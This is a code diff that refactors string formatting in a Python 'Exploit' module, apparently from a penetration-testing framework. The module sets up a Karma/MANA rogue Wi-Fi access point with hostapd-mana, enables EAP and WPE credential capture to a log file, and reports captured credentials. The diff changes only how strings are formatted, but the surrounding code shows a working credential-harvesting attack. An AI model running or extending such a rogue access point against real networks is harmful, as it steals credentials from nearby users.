@@ -129,8 +129,8 @@ class Exploit(Exploit):
             hostapd_conf = hostapd_conf.replace("# eap_server=1", "eap_server=1")
             hostapd_conf = hostapd_conf.replace("# mana_wpe=1", "mana_wpe=1")
             hostapd_conf = hostapd_conf.replace(
-                "# mana_credout={log_dir}/mana_creds.log".format(log_dir=str(log_dir)),
-                "mana_credout={}/mana_creds.log".format(str(log_dir)),
+                f"# mana_credout={log_dir!s}/mana_creds.log",
+                f"mana_credout={log_dir!s}/mana_creds.log",
             )
 
         hostapd_path = tmp_dir / "hostapd_karma.conf"
@@ -184,7 +184,7 @@ class Exploit(Exploit):
 
         is_mana = "hostapd-mana" in hostapd_bin
         if self.mode in ("mana_loud", "mana_eap") and not is_mana:
-            print_error("Mode '{}' requires hostapd-mana, but only hostapd was found.".format(self.mode))
+            print_error(f"Mode '{self.mode}' requires hostapd-mana, but only hostapd was found.")
             return
 
         tmp_dir = Path(".tmp")
@@ -193,14 +193,13 @@ class Exploit(Exploit):
 
         if self.dry_run:
             print_info("DRY RUN — generated configs:")
-            print_info("  hostapd: {}".format(hostapd_path))
-            print_info("  dnsmasq: {}".format(dnsmasq_path))
-            print_status("Would execute: sudo {} {}".format(hostapd_bin, hostapd_path))
+            print_info(f"  hostapd: {hostapd_path}")
+            print_info(f"  dnsmasq: {dnsmasq_path}")
+            print_status(f"Would execute: sudo {hostapd_bin} {hostapd_path}")
             return
 
-        print_status("Launching {} attack via {}...".format(self.mode, hostapd_bin))
-        print_info("Interface: {}  Channel: {}  SSID: {}".format(
-            self.interface, self.channel, self.ssid))
+        print_status(f"Launching {self.mode} attack via {hostapd_bin}...")
+        print_info(f"Interface: {self.interface}  Channel: {self.channel}  SSID: {self.ssid}")
 
         setup_cmds = [
             ["sudo", "ifconfig", self.interface, "10.0.0.1", "netmask", "255.255.255.0", "up"],
@@ -226,5 +225,5 @@ class Exploit(Exploit):
 
         creds_log = Path(".log") / "mana_creds.log"
         if creds_log.exists():
-            print_success("Captured credentials: {}".format(creds_log))
+            print_success(f"Captured credentials: {creds_log}")
         print_info("Attack session complete.")
